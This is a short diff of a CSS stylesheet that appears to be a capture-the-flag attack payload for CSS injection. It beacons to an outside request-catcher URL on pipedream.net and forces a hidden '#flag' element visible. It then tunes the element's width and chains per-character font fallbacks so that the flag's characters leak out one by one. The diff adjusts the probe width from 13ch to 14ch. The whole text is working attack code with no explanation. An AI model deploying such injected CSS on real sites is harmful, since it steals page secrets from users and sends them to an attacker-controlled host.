@@ -1,16 +1,11 @@
-/* beacon */
-body { background-image: url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=BEACON'); }
-
-/* Bypass */
+/* Width 14 — CONTENT[0] on line1 */
+body { background-image: url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=W14'); }
 #page { content-visibility: hidden; animation: unveil 0.001s 0.3s forwards; }
 @keyframes unveil { to { content-visibility: visible; } }
 #flag { display: block !important; }
-
-/* CONTENT-ONLY probe: 13ch width forces prefix onto line 1 */
-/* ::first-line override removes probes from line 1 chars   */
 #flag {
   font-family: p97, p98, p99, p100, p101, p102, p103, p104, p105, p106, p107, p108, p109, p110, p111, p112, p113, p114, p115, p116, p117, p118, p119, p120, p121, p122, p48, p49, p50, p51, p52, p53, p54, p55, p56, p57, p95, p123, p125, monospace;
-  width: 13ch;
+  width: 14ch;
   white-space: pre-wrap;
   word-break: break-all;
   overflow: visible;
